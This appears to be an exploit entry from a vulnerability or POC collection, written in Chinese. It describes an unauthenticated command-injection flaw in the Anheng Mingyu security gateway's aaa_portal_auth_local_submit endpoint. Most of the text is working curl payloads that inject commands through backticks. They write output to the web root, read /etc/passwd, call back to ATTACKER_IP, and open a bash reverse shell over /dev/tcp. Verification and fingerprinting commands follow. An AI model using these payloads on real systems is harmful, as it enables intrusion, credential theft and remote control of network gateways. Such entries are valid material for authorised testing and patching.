---
id: ANHENG-GATEWAY-RCE
title: 安恒明御安全网关 aaa_portal_auth_local_submit 远程命令执行漏洞
product: anheng
vendor: Anheng (安恒)
version_affected: "安恒明御安全网关（受影响版本）"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["安恒", "明御", "明御安全网关"]
---

## 漏洞描述

安恒明御安全网关的 `aaa_portal_auth_local_submit` 接口在处理 `suffix` 参数时，将其直接拼接到 shell 命令中执行，未进行过滤和转义。攻击者可通过反引号注入任意系统命令，实现未经认证的远程命令执行。

## 影响版本

- 安恒明御安全网关（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/webui/` 接口可达

## 利用步骤

1. 确认目标为安恒明御安全网关
2. 向 `/webui/?g=aaa_portal_auth_local_submit` 接口发送请求
3. 在 `suffix` 参数中通过反引号注入系统命令，将输出写入 Web 可访问目录
4. 通过 HTTP 请求读取写入的文件，获取命令输出

## Payload

### 命令执行并写入文件

```bash
curl "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60id%20%3E/usr/local/webui/test.txt%60"
```

### 读取命令输出

```bash
curl "http://target/test.txt"
```

### 读取 /etc/passwd

```bash
curl "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60cat%20/etc/passwd%20%3E/usr/local/webui/passwd.txt%60"
```

```bash
curl "http://target/passwd.txt"
```

### HTTP 回调

```bash
curl "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60curl%20http://ATTACKER_IP/callback%60"
```

### 反弹 shell

```bash
curl "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%60"
```

## 验证方法

```bash
# 执行命令写入文件后读取
curl -s "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60id%20%3E/usr/local/webui/test.txt%60"
curl -s "http://target/test.txt" | grep "uid="

# HTTP 回调验证
# 攻击者: nc -lvp 80
curl -s "http://target/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60curl%20http://ATTACKER_IP/callback%60"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "安恒\|明御\|明御安全网关"
curl -s -o /dev/null -w "%{http_code}" "http://target/webui/"
```
